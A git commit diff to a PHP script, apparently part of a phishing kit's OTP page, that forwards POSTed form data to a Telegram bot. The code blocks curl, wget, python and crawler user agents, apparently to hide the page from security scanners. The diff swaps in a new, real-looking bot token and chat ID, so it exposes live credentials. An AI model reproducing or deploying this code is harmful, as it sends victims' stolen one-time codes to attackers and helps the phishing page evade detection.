6c09f544e6b6e3c906397cb3249059847168909a
thewinpers <thewinpers@gmail.com>
2025-03-27 10:54:51 +0000

    updated telegram bot in otp page

--- Security-Officer/Movetosafety/send_to_telegram.php
+++ Security-Officer/Movetosafety/send_to_telegram.php
@@ -8,9 +8,17 @@ include('prevents/anti7.php');
 include('prevents/anti3.php');
 
 
-function blockSuspiciousUserAgent() {
+function blockSuspiciousUserAgent()
+{
     $botAgents = [
-        'curl', 'wget', 'bot', 'crawler', 'spider', 'http', 'python', 'java'
+        'curl',
+        'wget',
+        'bot',
+        'crawler',
+        'spider',
+        'http',
+        'python',
+        'java'
     ];
     $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
     foreach ($botAgents as $bot) {
@@ -21,9 +29,10 @@ function blockSuspiciousUserAgent() {
     }
 }
 
-function blockSuspiciousIPs() {
+function blockSuspiciousIPs()
+{
     $blockedIPs = [
-        '192.168.1.1', 
+        '192.168.1.1',
         '123.456.789.0',
     ];
     if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
@@ -36,11 +45,10 @@ function blockSuspiciousIPs() {
 blockSuspiciousUserAgent();
 blockSuspiciousIPs();
 
-$botToken = "7242857412:AAHCG6DxmgZJv-NZ3uqTCDqpw56Ql8mKnlY";
-$chatId = "-1002570216135";
+$botToken = "7274962782:AAGi2HZlpm4EGxeoPWrLURWIApxrQls08yw";
+$chatId = "-4770377680";
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $message = $_POST['message'];
     file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
 }
-?>
